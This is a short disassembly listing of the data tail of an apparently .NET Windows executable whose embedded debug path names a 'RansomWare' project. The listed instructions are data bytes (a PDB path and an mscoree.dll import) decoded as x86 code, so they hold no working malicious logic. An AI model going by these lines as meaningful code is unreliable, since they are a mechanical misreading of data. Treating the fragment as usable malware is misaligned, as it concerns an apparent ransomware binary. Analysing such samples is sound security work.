  409110:	00 50 41             	add    %dl,0x41(%eax)
  409113:	44                   	inc    %esp
  409114:	50                   	push   %eax
  409115:	41                   	inc    %ecx
  409116:	44                   	inc    %esp
  409117:	50                   	push   %eax
  409118:	b4 00                	mov    $0x0,%ah
  40911a:	00 00                	add    %al,(%eax)
  40911c:	00 00                	add    %al,(%eax)
  40911e:	00 00                	add    %al,(%eax)
  409120:	43                   	inc    %ebx
  409121:	09 b2 cd 00 00 00    	or     %esi,0xcd(%edx)
  409127:	00 02                	add    %al,(%edx)
  409129:	00 00                	add    %al,(%eax)
  40912b:	00 63 00             	add    %ah,0x0(%ebx)
  40912e:	00 00                	add    %al,(%eax)
  409130:	54                   	push   %esp
  409131:	91                   	xchg   %eax,%ecx
  409132:	00 00                	add    %al,(%eax)
  409134:	54                   	push   %esp
  409135:	73 00                	jae    0x409137
	...
  409143:	00 10                	add    %dl,(%eax)
	...
  409151:	00 00                	add    %al,(%eax)
  409153:	00 52 53             	add    %dl,0x53(%edx)
  409156:	44                   	inc    %esp
  409157:	53                   	push   %ebx
  409158:	7b 8d                	jnp    0x4090e7
  40915a:	94                   	xchg   %eax,%esp
  40915b:	84 27                	test   %ah,(%edi)
  40915d:	69 e7 4d 85 8c 35    	imul   $0x358c854d,%edi,%esp
  409163:	1c 50                	sbb    $0x50,%al
  409165:	74 57                	je     0x4091be
  409167:	49                   	dec    %ecx
  409168:	01 00                	add    %eax,(%eax)
  40916a:	00 00                	add    %al,(%eax)
  40916c:	43                   	inc    %ebx
  40916d:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
  409171:	65 72 73             	gs jb  0x4091e7
  409174:	5c                   	pop    %esp
  409175:	61                   	popa
  409176:	64 6d                	fs insl (%dx),%es:(%edi)
  409178:	69 6e 5c 73 6f 75 72 	imul   $0x72756f73,0x5c(%esi),%ebp
  40917f:	63 65 5c             	arpl   %esp,0x5c(%ebp)
  409182:	72 65                	jb     0x4091e9
  409184:	70 6f                	jo     0x4091f5
  409186:	73 5c                	jae    0x4091e4
  409188:	52                   	push   %edx
  409189:	61                   	popa
  40918a:	6e                   	outsb  %ds:(%esi),(%dx)
  40918b:	73 6f                	jae    0x4091fc
  40918d:	6d                   	insl   (%dx),%es:(%edi)
  40918e:	57                   	push   %edi
  40918f:	61                   	popa
  409190:	72 65                	jb     0x4091f7
  409192:	5c                   	pop    %esp
  409193:	52                   	push   %edx
  409194:	61                   	popa
  409195:	6e                   	outsb  %ds:(%esi),(%dx)
  409196:	73 6f                	jae    0x409207
  409198:	6d                   	insl   (%dx),%es:(%edi)
  409199:	57                   	push   %edi
  40919a:	61                   	popa
  40919b:	72 65                	jb     0x409202
  40919d:	5c                   	pop    %esp
  40919e:	6f                   	outsl  %ds:(%esi),(%dx)
  40919f:	62 6a 5c             	bound  %ebp,0x5c(%edx)
  4091a2:	44                   	inc    %esp
  4091a3:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4091a7:	5c                   	pop    %esp
  4091a8:	52                   	push   %edx
  4091a9:	61                   	popa
  4091aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4091ab:	73 6f                	jae    0x40921c
  4091ad:	6d                   	insl   (%dx),%es:(%edi)
  4091ae:	57                   	push   %edi
  4091af:	61                   	popa
  4091b0:	72 65                	jb     0x409217
  4091b2:	2e 70 64             	jo,pn  0x409219
  4091b5:	62 00                	bound  %eax,(%eax)
  4091b7:	df 91 00 00 00 00    	fists  0x0(%ecx)
  4091bd:	00 00                	add    %al,(%eax)
  4091bf:	00 00                	add    %al,(%eax)
  4091c1:	00 00                	add    %al,(%eax)
  4091c3:	f9                   	stc
  4091c4:	91                   	xchg   %eax,%ecx
  4091c5:	00 00                	add    %al,(%eax)
  4091c7:	00 20                	add    %ah,(%eax)
	...
  4091dd:	00 00                	add    %al,(%eax)
  4091df:	eb 91                	jmp    0x409172
	...
  4091ed:	5f                   	pop    %edi
  4091ee:	43                   	inc    %ebx
  4091ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4091f0:	72 45                	jb     0x409237
  4091f2:	78 65                	js     0x409259
  4091f4:	4d                   	dec    %ebp
  4091f5:	61                   	popa
  4091f6:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  4091fd:	72 65                	jb     0x409264
  4091ff:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  409203:	6c                   	insb   (%dx),%es:(%edi)
  409204:	00 00                	add    %al,(%eax)
  409206:	00 00                	add    %al,(%eax)
  409208:	00 00                	add    %al,(%eax)
  40920a:	ff 25 00 20 40 00    	jmp    *0x402000
